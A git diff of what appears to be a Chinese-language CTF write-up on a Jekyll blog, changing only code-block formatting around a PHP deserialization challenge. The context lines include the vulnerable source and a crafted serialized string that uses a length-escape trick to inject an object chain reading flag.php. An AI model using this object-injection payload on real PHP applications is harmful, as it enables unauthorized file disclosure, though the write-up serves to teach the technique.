@@ -16,7 +16,7 @@ excerpt_separator: ""
 
 直接给了源码：
 
-```php
+{% highlight php linenos %}
 <?php
 show_source("index.php");
 function write($data) {
@@ -56,7 +56,7 @@ class C{
 $a = new A($_GET['a'],$_GET['b']);
 //省略了存储序列化数据的过程,下面是取出来并反序列化的操作
 $b = unserialize(read(write(serialize($a))));
-```
+{% endhighlight%}
 
 ## 解题思路
 
@@ -85,9 +85,9 @@ O:1:"A":2:{s:8:"username";s:3:"foo";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:
 
 需要吞掉24个字符，于是提交的序列化字符串为：
 
-```shell
+{% highlight linenos %}
 O:1:"A":2:{s:8:"username";s:48:"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";s:8:"password";s:74:";";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}}";}
-```
+{% endhighlight%}
 
 Payload：
 
